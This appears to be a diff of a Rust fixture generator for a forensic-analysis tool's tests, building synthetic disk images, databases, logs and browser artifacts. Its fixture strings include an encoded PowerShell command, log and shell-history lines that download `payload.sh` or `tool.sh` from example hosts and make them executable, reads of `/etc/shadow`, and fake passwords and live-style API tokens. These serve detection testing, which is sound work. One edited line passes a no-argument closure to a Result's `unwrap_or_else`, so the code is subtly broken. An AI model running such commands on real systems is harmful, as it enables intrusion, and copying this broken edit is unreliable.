@@ -18,8 +18,8 @@ pub struct TestWorkspace {
 pub fn generate_workspace(seed: u64) -> TestWorkspace {
     let root = std::env::temp_dir().join(format!("analysisloom_test_{seed}"));
     let _ = std::fs::remove_dir_all(&root);
-    std::fs::create_dir_all(&root).expect("create workspace");
-    std::fs::create_dir_all(root.join("carved")).expect("create carved dir");
+    std::fs::create_dir_all(&root).unwrap_or_else(|e| panic!("create workspace: {e}"));
+    std::fs::create_dir_all(root.join("carved")).unwrap_or_else(|e| panic!("create carved dir: {e}"));
 
     let mut rng = StdRng::seed_from_u64(seed);
 
@@ -56,7 +56,7 @@ pub fn generate_workspace(seed: u64) -> TestWorkspace {
 fn ntfs_timestamp_bytes() -> [u8; 8] {
     let unix = std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
-        .unwrap()
+        .unwrap_or_else(|| panic!("time since unix epoch"))
         .as_secs() as i64;
     let ntfs = (unix + 11_644_473_600) * 10_000_000;
     ntfs.to_le_bytes()
@@ -127,7 +127,7 @@ fn write_ntfs_image(path: &Path, rng: &mut StdRng) {
     let record_size = 1024u64;
     // Parser scans 256 consecutive records from mft_offset — image must cover that span.
     let image_size =
-        (mft_offset + record_size * MFT_SCAN_RECORDS + rng.random_range(0u64..8192)) as usize;
+        (mft_offset + record_size * MFT_SCAN_RECORDS + rng.gen_range(0u64..8192)) as usize;
 
     let mut image = vec![0u8; image_size];
     write_ntfs_boot_sector(&mut image[..512], MFT_CLUSTER);
@@ -160,15 +160,15 @@ fn write_ntfs_image(path: &Path, rng: &mut StdRng) {
         image[jpeg_off..jpeg_off + 3].copy_from_slice(&[0xFF, 0xD8, 0xFF]);
     }
 
-    let mut f = std::fs::File::create(path).expect("create ntfs image");
-    f.write_all(&image).expect("write ntfs image");
+    let mut f = std::fs::File::create(path).unwrap_or_else(|e| panic!("create ntfs image: {e}"));
+    f.write_all(&image).unwrap_or_else(|e| panic!("write ntfs image: {e}"));
 }
 
 fn write_luks_image(path: &Path, rng: &mut StdRng) {
     let mut data = vec![0u8; 65536];
     data[0..6].copy_from_slice(b"LUKS\xba\xbe");
     rng.fill(&mut data[512..]);
-    std::fs::write(path, &data).expect("write luks image");
+    std::fs::write(path, &data).unwrap_or_else(|e| panic!("write luks image: {e}"));
 }
 
 fn write_carve_image(path: &Path, rng: &mut StdRng) {
@@ -178,31 +178,31 @@ fn write_carve_image(path: &Path, rng: &mut StdRng) {
     data[4096..4096 + 8].copy_from_slice(b"\x89PNG\r\n\x1a\n");
     data[12000..12000 + 4].copy_from_slice(b"%PDF");
     data[24000..24000 + 15].copy_from_slice(b"SQLite format 3");
-    std::fs::write(path, &data).expect("write carve image");
+    std::fs::write(path, &data).unwrap_or_else(|e| panic!("write carve image: {e}"));
 }
 
 fn write_sqlite_db(path: &Path, rng: &mut StdRng) {
-    let conn = rusqlite::Connection::open(path).expect("open sqlite");
+    let conn = rusqlite::Connection::open(path).unwrap_or_else(|e| panic!("open sqlite: {e}"));
     conn.execute_batch(
         "CREATE TABLE messages (id INTEGER PRIMARY KEY, sender TEXT, message TEXT, timestamp INTEGER);
          CREATE TABLE contacts (id INTEGER PRIMARY KEY, name TEXT, phone TEXT);",
     )
-    .expect("schema");
+    .unwrap_or_else(|e| panic!("schema: {e}"));
 
     for i in 0..15 {
-        let sender = format!("+628{:08}", rng.random_range(10_000_000..99_999_999));
+        let sender = format!("+628{:08}", rng.gen_range(10_000_000..99_999_999));
         let msg = format!("Random forensic message #{i} password token");
         conn.execute(
             "INSERT INTO messages (sender, message, timestamp) VALUES (?1, ?2, ?3)",
             rusqlite::params![sender, msg, 1_700_000_000 + i],
         )
-        .expect("insert message");
+        .unwrap_or_else(|e| panic!("insert message: {e}"));
     }
     conn.execute(
         "INSERT INTO contacts (name, phone) VALUES ('Suspect A', '+62812345678')",
         [],
     )
-    .expect("insert contact");
+    .unwrap_or_else(|e| panic!("insert contact: {e}"));
 }
 
 fn write_evidence_text(path: &Path, rng: &mut StdRng) {
@@ -210,12 +210,12 @@ fn write_evidence_text(path: &Path, rng: &mut StdRng) {
         "CONFIDENTIAL forensic export".into(),
         "user password=RandomP@ss123!".into(),
         "powershell -NoProfile -enc SQBFAFgA".into(),
-        "api_token=sk-live-".to_string() + &hex::encode(&rng.random::<[u8; 8]>()),
+        "api_token=sk-live-".to_string() + &hex::encode(&rng.gen::<[u8; 8]>()),
     ];
-    for i in 0..rng.random_range(5..20) {
-        lines.push(format!("log line {i}: random data {}", rng.random::<u32>()));
+    for i in 0..rng.gen_range(5..20) {
+        lines.push(format!("log line {i}: random data {}", rng.gen::<u32>()));
     }
-    std::fs::write(path, lines.join("\n")).expect("write evidence");
+    std::fs::write(path, lines.join("\n")).unwrap_or_else(|e| panic!("write evidence: {e}"));
 }
 
 fn write_minimal_png(path: &Path) {
@@ -227,12 +227,13 @@ fn write_minimal_png(path: &Path) {
         0xCF, 0xC0, 0x00, 0x00, 0x03, 0x01, 0x01, 0x00, 0x18, 0xDD, 0x8D, 0xB4, 0x00, 0x00, 0x00,
         0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82,
     ];
-    std::fs::write(path, png).expect("write png");
+    std::fs::write(path, png).unwrap_or_else(|e| panic!("write png: {e}"));
 }
 
 /// Extra fixtures for README screenshots (browser DB, registry hive, Volatility JSON).
 pub fn write_screenshot_extras(dest: &Path) {
-    std::fs::create_dir_all(dest.join("carved_out")).expect("create carved_out");
+    std::fs::create_dir_all(dest.join("carved_out"))
+        .unwrap_or_else(|e| panic!("create carved_out: {e}"));
     write_minimal_system_hive(&dest.join("SYSTEM"));
     write_volatility_json(&dest.join("volatility.json"));
     write_browser_profile(&dest.join("browser_profile"));
@@ -252,7 +253,7 @@ pub fn write_v2_extras(dest: &Path) {
 /// V2.1 backlog fixtures — Windows artifacts, stego, email, chat, Linux.
 pub fn write_v21_extras(dest: &Path) {
     let prefetch_dir = dest.join("Windows/Prefetch");
-    std::fs::create_dir_all(&prefetch_dir).expect("prefetch dir");
+    std::fs::create_dir_all(&prefetch_dir).unwrap_or_else(|e| panic!("prefetch dir: {e}"));
     write_synthetic_prefetch(&prefetch_dir.join("NOTEPAD.EXE-ABC123.pf"));
     write_synthetic_lnk(&dest.join("recent/notepad.lnk"));
     write_synthetic_jump_list(
@@ -268,7 +269,8 @@ pub fn write_v21_extras(dest: &Path) {
 /// Combined Windows + Linux + macOS indicators for acquisition detection tests.
 pub fn write_cross_platform_acquisition(dest: &Path) {
     let evtx = dest.join("Windows/Logs/Security.evtx");
-    std::fs::create_dir_all(evtx.parent().expect("evtx parent")).expect("windows logs dir");
+    std::fs::create_dir_all(evtx.parent().unwrap_or_else(|| panic!("evtx parent")))
+        .unwrap_or_else(|e| panic!("windows logs dir: {e}"));
     write_synthetic_evtx(&evtx);
     write_synthetic_prefetch(&dest.join("Windows/Prefetch/EXPLORER.EXE-DEF456.pf"));
     write_linux_logs(&dest.join("var/log"));
@@ -286,11 +288,12 @@ fn write_synthetic_prefetch(path: &Path) {
         data[off..off + 2].copy_from_slice(&ch.to_le_bytes());
     }
     data[0x48..0x4C].copy_from_slice(&12u32.to_le_bytes());
-    std::fs::write(path, data).expect("write prefetch");
+    std::fs::write(path, data).unwrap_or_else(|e| panic!("write prefetch: {e}"));
 }
 
 fn write_synthetic_lnk(path: &Path) {
-    std::fs::create_dir_all(path.parent().expect("lnk parent")).expect("lnk dir");
+    std::fs::create_dir_all(path.parent().unwrap_or_else(|| panic!("lnk parent")))
+        .unwrap_or_else(|e| panic!("lnk dir: {e}"));
     let target = "C:\\Windows\\System32\\notepad.exe";
     let mut data = vec![0u8; 0x200];
     data[0..4].copy_from_slice(&0x4Cu32.to_le_bytes());
@@ -302,11 +305,12 @@ fn write_synthetic_lnk(path: &Path) {
     data[0x60..0x64].copy_from_slice(&local_off.to_le_bytes());
     let base = 0x4C + 0x1C;
     data[base..base + target.len()].copy_from_slice(target.as_bytes());
-    std::fs::write(path, data).expect("write lnk");
+    std::fs::write(path, data).unwrap_or_else(|e| panic!("write lnk: {e}"));
 }
 
 fn write_synthetic_jump_list(path: &Path) {
-    std::fs::create_dir_all(path.parent().expect("jl parent")).expect("jl dir");
+    std::fs::create_dir_all(path.parent().unwrap_or_else(|| panic!("jl parent")))
+        .unwrap_or_else(|e| panic!("jl dir: {e}"));
     let mut data = vec![0u8; 512];
     data[0..8].copy_from_slice(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
     let path_utf16: Vec<u8> = "C:\\Users\\Analyst\\Documents\\report.docx"
@@ -314,7 +318,7 @@ fn write_synthetic_jump_list(path: &Path) {
         .flat_map(|c| c.to_le_bytes())
         .collect();
     data[128..128 + path_utf16.len()].copy_from_slice(&path_utf16);
-    std::fs::write(path, data).expect("write jump list");
+    std::fs::write(path, data).unwrap_or_else(|e| panic!("write jump list: {e}"));
 }
 
 fn write_stego_png(path: &Path) {
@@ -337,7 +341,7 @@ fn write_stego_png(path: &Path) {
     ]);
     let secret = b"hidden";
     png.extend_from_slice(secret);
-    std::fs::write(path, png).expect("write stego png");
+    std::fs::write(path, png).unwrap_or_else(|e| panic!("write stego png: {e}"));
 }
 
 fn write_synthetic_pst(path: &Path) {
@@ -348,13 +352,14 @@ fn write_synthetic_pst(path: &Path) {
     data[0x400..0x400 + header.len()].copy_from_slice(header.as_bytes());
     let folder = "Inbox\0Sent Items\0";
     data[0x800..0x800 + folder.len()].copy_from_slice(folder.as_bytes());
-    std::fs::write(path, data).expect("write pst");
+    std::fs::write(path, data).unwrap_or_else(|e| panic!("write pst: {e}"));
 }
 
 fn write_whatsapp_db(path: &Path) {
-    std::fs::create_dir_all(path.parent().expect("wa parent")).expect("wa dir");
+    std::fs::create_dir_all(path.parent().unwrap_or_else(|| panic!("wa parent")))
+        .unwrap_or_else(|e| panic!("wa dir: {e}"));
     let _ = std::fs::remove_file(path);
-    let conn = rusqlite::Connection::open(path).expect("wa db");
+    let conn = rusqlite::Connection::open(path).unwrap_or_else(|e| panic!("wa db: {e}"));
     conn.execute_batch(
         "CREATE TABLE messages (
             _id INTEGER PRIMARY KEY,
@@ -365,7 +370,7 @@ fn write_whatsapp_db(path: &Path) {
             media_wa_type INTEGER
         );",
     )
-    .expect("wa schema");
+    .unwrap_or_else(|e| panic!("wa schema: {e}"));
     conn.execute(
         "INSERT INTO messages (key_remote_jid, remote_resource, data, timestamp, media_wa_type) VALUES (?1, ?2, ?3, ?4, ?5)",
         rusqlite::params![
@@ -376,40 +381,40 @@ fn write_whatsapp_db(path: &Path) {
             0i64
         ],
     )
-    .expect("wa insert");
+    .unwrap_or_else(|e| panic!("wa insert: {e}"));
 }
 
 fn write_linux_logs(root: &Path) {
-    std::fs::create_dir_all(root).expect("linux dir");
+    std::fs::create_dir_all(root).unwrap_or_else(|e| panic!("linux dir: {e}"));
     std::fs::write(
         root.join("auth.log"),
         "Jun  6 10:15:01 workstation sshd[1234]: Accepted password for analyst from 192.168.1.50 port 22\n\
          Jun  6 10:16:44 workstation sshd[1235]: Failed password for invalid user admin from 10.0.0.99 port 4444\n\
          Jun  6 10:17:02 workstation sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/cat /etc/shadow\n",
     )
-    .expect("auth.log");
+    .unwrap_or_else(|e| panic!("auth.log: {e}"));
     std::fs::write(
         root.join("audit.log"),
         "type=USER_AUTH msg=audit(1717665301.123:456): pid=1234 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_unix acct=analyst exe=/usr/sbin/sshd'\n\
          type=EXECVE msg=audit(1717665400.456:789): pid=5678 uid=1000 auid=1000 ses=1 exe=/usr/bin/curl cmd=curl -s https://example.com/payload.sh\n",
     )
-    .expect("audit.log");
+    .unwrap_or_else(|e| panic!("audit.log: {e}"));
     std::fs::write(
         root.join(".bash_history"),
         "ls -la /var/log\nsudo cat /etc/passwd\ncurl -O https://cdn.example.com/tool.sh\nchmod +x tool.sh\n",
     )
-    .expect("bash_history");
+    .unwrap_or_else(|e| panic!("bash_history: {e}"));
     std::fs::write(
         root.join("syslog"),
         "Jun  6 10:20:01 workstation sudo: analyst : TTY=pts/0 ; USER=root ; COMMAND=/bin/cat /etc/shadow\n\
          Jun  6 10:21:44 workstation sshd[2001]: Failed password for invalid user root from 10.0.0.55\n",
     )
-    .expect("syslog");
+    .unwrap_or_else(|e| panic!("syslog: {e}"));
     std::fs::write(
         root.join("cron.log"),
         "Jun  6 02:00:01 CRON[999]: (root) CMD (/usr/local/bin/backup.sh)\n",
     )
-    .expect("cron.log");
+    .unwrap_or_else(|e| panic!("cron.log: {e}"));
 }
 
 /// CollectionLoom-style signed hash_manifest.json for integrity verification tests.
@@ -463,14 +468,16 @@ pub fn write_hash_manifest(dest: &Path, evidence_txt: &Path, evidence_png: &Path
         157, 97, 177, 157, 239, 253, 90, 96, 186, 132, 74, 219, 218, 87, 0, 97, 130, 95, 34, 63,
         147, 44, 47, 64, 71, 73, 119, 149, 182, 168, 40, 94,
     ]);
-    integrity::sign_manifest(&mut manifest, &signing_key).expect("sign manifest");
+    integrity::sign_manifest(&mut manifest, &signing_key)
+        .unwrap_or_else(|e| panic!("sign manifest: {e}"));
 
     let path = dest.join("hash_manifest.json");
     std::fs::write(
         &path,
-        serde_json::to_string_pretty(&manifest).expect("serialize manifest"),
+        serde_json::to_string_pretty(&manifest)
+            .unwrap_or_else(|e| panic!("serialize manifest: {e}")),
     )
-    .expect("write hash_manifest.json");
+    .unwrap_or_else(|e| panic!("write hash_manifest.json: {e}"));
     path
 }
 
@@ -479,7 +486,7 @@ fn write_minimal_system_hive(path: &Path) {
     data[0..4].copy_from_slice(b"regf");
     let file_size = data.len() as u32;
     data[0x28..0x2c].copy_from_slice(&file_size.to_le_bytes());
-    std::fs::write(path, &data).expect("write SYSTEM hive");
+    std::fs::write(path, &data).unwrap_or_else(|e| panic!("write SYSTEM hive: {e}"));
 }
 
 fn write_volatility_json(path: &Path) {
@@ -493,7 +500,7 @@ fn write_volatility_json(path: &Path) {
     {"PID": 2048, "Proto": "TCP", "LocalAddr": "192.168.1.10:49152", "ForeignAddr": "185.220.101.45:443", "State": "ESTABLISHED"}
   ]
 }"#;
-    std::fs::write(path, json).expect("write volatility.json");
+    std::fs::write(path, json).unwrap_or_else(|e| panic!("write volatility.json: {e}"));
 }
 
 fn write_synthetic_evtx(path: &Path) {
@@ -534,7 +541,7 @@ fn write_synthetic_evtx(path: &Path) {
     let xml_bytes = xml.as_bytes();
     let len = xml_bytes.len().min(data.len() - off);
     data[off..off + len].copy_from_slice(&xml_bytes[..len]);
-    std::fs::write(path, &data).expect("write evtx");
+    std::fs::write(path, &data).unwrap_or_else(|e| panic!("write evtx: {e}"));
 }
 
 fn write_synthetic_pcap(path: &Path) {
@@ -563,55 +570,58 @@ fn write_synthetic_pcap(path: &Path) {
     buf.extend_from_slice(&incl.to_le_bytes());
     buf.extend_from_slice(&pkt);
 
-    std::fs::write(path, buf).expect("write pcap");
+    std::fs::write(path, buf).unwrap_or_else(|e| panic!("write pcap: {e}"));
 }
 
 fn write_macos_profile(root: &Path) {
     let kc = root.join("Library/Application Support/KnowledgeC.db");
-    std::fs::create_dir_all(kc.parent().expect("kc parent")).expect("macos dirs");
+    std::fs::create_dir_all(kc.parent().unwrap_or_else(|| panic!("kc parent")))
+        .unwrap_or_else(|e| panic!("macos dirs: {e}"));
     let _ = std::fs::remove_file(&kc);
-    let conn = rusqlite::Connection::open(&kc).expect("knowledgec");
+    let conn = rusqlite::Connection::open(&kc).unwrap_or_else(|e| panic!("knowledgec: {e}"));
     conn.execute_batch(
         "CREATE TABLE ZOBJECT (Z_PK INTEGER PRIMARY KEY, ZSTARTDATE REAL, ZSTREAMNAME TEXT);
          CREATE TABLE ZHISTORYITEM (Z_PK INTEGER PRIMARY KEY, ZTITLE TEXT, ZURL TEXT);",
     )
-    .expect("kc schema");
+    .unwrap_or_else(|e| panic!("kc schema: {e}"));
     conn.execute(
         "INSERT INTO ZOBJECT (ZSTARTDATE, ZSTREAMNAME) VALUES (738000.0, '/Applications/Safari.app')",
         [],
     )
-    .expect("kc insert");
+    .unwrap_or_else(|e| panic!("kc insert: {e}"));
     conn.execute(
         "INSERT INTO ZHISTORYITEM (ZTITLE, ZURL) VALUES ('Forensic Search', 'https://github.com')",
         [],
     )
-    .expect("history insert");
+    .unwrap_or_else(|e| panic!("history insert: {e}"));
 
     let plist_path = root.join("Library/Preferences/com.apple.loginwindow.plist");
-    std::fs::create_dir_all(plist_path.parent().expect("plist parent")).expect("plist dir");
+    std::fs::create_dir_all(plist_path.parent().unwrap_or_else(|| panic!("plist parent")))
+        .unwrap_or_else(|e| panic!("plist dir: {e}"));
     let plist_xml = r#"<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0"><dict>
   <key>lastUserName</key><string>forensic_analyst</string>
   <key>GuestEnabled</key><false/>
 </dict></plist>"#;
-    std::fs::write(&plist_path, plist_xml).expect("write plist");
+    std::fs::write(&plist_path, plist_xml).unwrap_or_else(|e| panic!("write plist: {e}"));
 
     std::fs::create_dir_all(root.join("Library/Logs/DiagnosticMessages.logarchive"))
-        .expect("logarchive");
+        .unwrap_or_else(|e| panic!("logarchive: {e}"));
 }
 
 fn write_browser_profile(root: &Path) {
     let history = root.join("Google/Chrome/User Data/Default/History");
-    std::fs::create_dir_all(history.parent().expect("history parent"))
-        .expect("create browser dirs");
+    std::fs::create_dir_all(history.parent().unwrap_or_else(|| panic!("history parent")))
+        .unwrap_or_else(|e| panic!("create browser dirs: {e}"));
     let _ = std::fs::remove_file(&history);
-    let conn = rusqlite::Connection::open(&history).expect("open chrome history");
+    let conn = rusqlite::Connection::open(&history)
+        .unwrap_or_else(|e| panic!("open chrome history: {e}"));
     conn.execute_batch(
         "CREATE TABLE urls (id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count INTEGER, last_visit_time INTEGER);
          CREATE TABLE downloads (id INTEGER PRIMARY KEY, target_path TEXT, tab_url TEXT, start_time INTEGER);",
     )
-    .expect("chrome schema");
+    .unwrap_or_else(|e| panic!("chrome schema: {e}"));
     conn.execute(
         "INSERT INTO urls (url, title, visit_count, last_visit_time) VALUES (?1, ?2, ?3, ?4)",
         rusqlite::params![
@@ -621,7 +631,7 @@ fn write_browser_profile(root: &Path) {
             133_000_000_000_000i64
         ],
     )
-    .expect("insert url");
+    .unwrap_or_else(|e| panic!("insert url: {e}"));
     conn.execute(
         "INSERT INTO downloads (target_path, tab_url, start_time) VALUES (?1, ?2, ?3)",
         rusqlite::params![
@@ -630,7 +640,7 @@ fn write_browser_profile(root: &Path) {
             132_000_000_000_000i64
         ],
     )
-    .expect("insert download");
+    .unwrap_or_else(|e| panic!("insert download: {e}"));
 }
 
 mod hex {
